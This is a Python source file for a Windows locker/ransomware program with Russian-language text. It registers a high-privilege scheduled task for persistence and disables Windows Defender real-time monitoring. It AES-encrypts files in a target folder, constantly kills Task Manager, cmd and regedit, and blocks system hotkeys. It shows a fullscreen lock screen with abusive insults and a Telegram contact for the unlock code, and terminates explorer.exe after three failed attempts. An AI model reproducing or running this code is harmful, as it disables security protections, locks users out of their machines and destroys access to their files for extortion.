# language: Python, file: locker.py
import ctypes
import os
import sys
import time
import threading
import subprocess
import psutil
import keyboard
import tkinter as tk
import winsound
from PIL import Image, ImageTk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# ================= НАСТРОЙКИ =================
CORRECT_CODE = "8841"
BLOKC_EXE = ["notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHacker.exe", "msconfig.exe", "iexplore.exe"]

# ================= ОБХОД UAC И АНТИВИРУСА =================
def elevate_and_evade():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        try:
            script = os.path.abspath(sys.argv[0])
            subprocess.run(["schtasks", "/create", "/tn", "WinLocker", 
                            "/tr", f'"{sys.executable}" "{script}"', 
                            "/sc", "onlogon", "/rl", "highest", "/f"], 
                           capture_output=True, shell=True)
            subprocess.run(["schtasks", "/run", "/tn", "WinLocker"], 
                           capture_output=True, shell=True)
        except:
            pass
        sys.exit(0)

    try:
        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
                        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;"
                        "Add-MpPreference -ExclusionPath 'TestFolder' -ErrorAction SilentlyContinue"], 
                       capture_output=True, creationflags=0x08000000)
    except:
        pass

# ================= ШИФРОВАНИЕ AES-256 =================
def encrypt_file(filepath, key, iv):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        if not data: return
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        with open(filepath, "wb") as f:
            f.write(encrypted_data)
    except Exception as e:
        print(f"Error {filepath}: {e}")

def encrypt_directory():
    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    target_dir = os.path.join(base_dir, "TestFolder")
    key_path = os.path.join(base_dir, "system_key.dat")

    if not os.path.exists(target_dir):
        return
        
    key = os.urandom(32)
    iv = os.urandom(16)
    
    with open(key_path, "wb") as f:
        f.write(key + iv)
        
    for root, dirs, files in os.walk(target_dir):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath.endswith(".locked"): continue
            encrypt_file(filepath, key, iv)

# ================= БЛОКИРОВКА ПРОЦЕССОВ =================
def block_applications():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() in BLOKC_EXE:
                proc.kill()
        except:
            pass

def start_blocking_loop():
    while True:
        block_applications()
        time.sleep(0.1)

# ================= ПУТИ К РЕСУРСАМ =================
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    full_path = os.path.join(base_path, relative_path)
    if not os.path.exists(full_path):
        return None
    return full_path

# ================= ИНТЕРФЕЙС =================
def main():
    elevate_and_evade()
    
    threading.Thread(target=start_blocking_loop, daemon=True).start()
    
    try:
        keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
        keyboard.add_hotkey('win+d', lambda: None, suppress=True)
        keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
        keyboard.block_key('win')
    except:
        pass

    win = tk.Tk()
    win.title('System Locker')
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    # Сценарий 1: Глаз
    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            eye = Image.open(eye_path).resize((420, 200))
            eye_photo = ImageTk.PhotoImage(eye)
            eye_label = tk.Label(win, image=eye_photo, bg="#000000", bd=0)
            eye_label.image = eye_photo
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
        except:
            eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
    else:
        eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
        eye_label.place(relx=0.5, rely=0.45, anchor="center")

    Text = "Booting System\n\nBoot Eror: x3131100\nBoot Eror: x3002123\nBoot Eror: x3001345\nBoot Eror: x011010001\nBoot Eror: x5111005\nBoot Eror: x00113210\n\nMemory section at adres 0x420 IS LOCKED!!"
    Text2 = "  WIN LOCKED ACTIVATE\n  CRYPTER starting..."
    
    label = tk.Label(win, text="", bg="#000000", fg="#FF0000", font=("Consolas", 15), anchor="w", justify="left")
    label.pack(pady=0, anchor="w", padx=0)
    
    label2 = tk.Label(win, text="", bg="#000000", fg="#656464", font=("Consolas", 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w", padx=0)

    i, i2 = 0, 0

    def typing():
        nonlocal i, i2
        if i <= len(Text):
            label.config(text=Text[:i])
            i += 1
            win.after(2, typing)
        elif i2 <= len(Text2):
            label2.config(text=Text2[:i2])
            i2 += 1
            win.after(2, typing)
        else:
            show_hacked_image()

    def show_hacked_image():
        label.pack_forget()
        label2.pack_forget()
        eye_label.place_forget()
        
        hacked_path = resource_path("assets/IMG_9170.PNG")
        if hacked_path:
            try:
                hacked = Image.open(hacked_path).resize((1200, 1000))
                hacked_photo = ImageTk.PhotoImage(hacked)
                hacked_label = tk.Label(win, image=hacked_photo, bg="#000000", bd=0)
                hacked_label.image = hacked_photo
                hacked_label.place(relx=0.5, rely=0.5, anchor="center")
            except:
                pass
            
        win.after(3000, start_locker)

    def start_locker():
        for widget in win.winfo_children():
            widget.destroy()
            
        # Звук при запуске локера
        try:
            sound_path = resource_path("scream.mp3")
            if sound_path:
                winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as e:
            print(f"Sound error: {e}")

        # Запуск шифрования
        threading.Thread(target=encrypt_directory, daemon=True).start()

        ss_path = resource_path("assets/s.png")
        if ss_path:
            try:
                ss = Image.open(ss_path).resize((300, 300))
                win.photo = ImageTk.PhotoImage(ss)
                ss_label = tk.Label(win, image=win.photo, bg="#000000", bd=0)
                ss_label.place(x=50, y=450)
            except:
                pass

        title = tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!", fg="#4f4f4f", bg="#000000", font=("Consolas", 18))
        title.pack(pady=(50, 20))

        info = tk.Label(win, text=(
            "Ваш компьютер подвержен блокировке хакерской группой Qack.\n"
            "Любые попытки снять вирус приведут к поломке компьютера,\n"
            "так что не выебывайся ублюдок.\n\n"
            "За кодом писать @pu709 (Telegram)"
        ), fg="#AAAAAA", bg="#000000", font=("Consolas", 13), justify="center")
        info.pack(pady=20)

        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF", font=("Consolas", 16), justify="center", width=25)
        entry.pack(pady=10)

        result = tk.Label(win, text="Попыток осталось: 3", fg="#FF0000", bg="#000000", font=("Consolas", 12))
        result.pack(pady=5)
        
        attempts = 0

        def check_code():
            nonlocal attempts
            if entry.get() == CORRECT_CODE:
                result.config(text="Код правильный!", fg="#00FF00")
                win.after(1000, win.destroy)
                return
            
            attempts += 1
            entry.delete(0, tk.END)
            left = 3 - attempts
            
            if left > 0:
                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
            else:
                # --- ФИНАЛЬНЫЙ ТЕКСТ И УБИЙСТВО EXPLORER.EXE ---
                for widget in win.winfo_children():
                    widget.destroy()
                
                win.configure(bg="#FF0000")
                
                troll_label = tk.Label(
                    win, 
                    text="ЕБАТЬ ТЫ ВЫБЛЯДОК ТУПОЙ", 
                    fg="#000000", 
                    bg="#FF0000", 
                    font=("Impact", 60), 
                    wraplength=1200
                )
                troll_label.pack(expand=True, fill="both")

                def kill_system():
                    try:
                        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], 
                                       capture_output=True, creationflags=0x08000000)
                        subprocess.run(["taskkill", "/f", "/im", "ctfmon.exe"], 
                                       capture_output=True, creationflags=0x08000000)
                    except:
                        pass
                
                threading.Thread(target=kill_system, daemon=True).start()

        button = tk.Button(win, text="ПРОВЕРИТЬ", command=check_code, bg="#222222", fg="#FFFFFF", font=("Consolas", 12), bd=0, padx=20, pady=8)
        button.pack(pady=10)
        entry.focus()

    typing()
    win.mainloop()

if __name__ == "__main__":
    main()
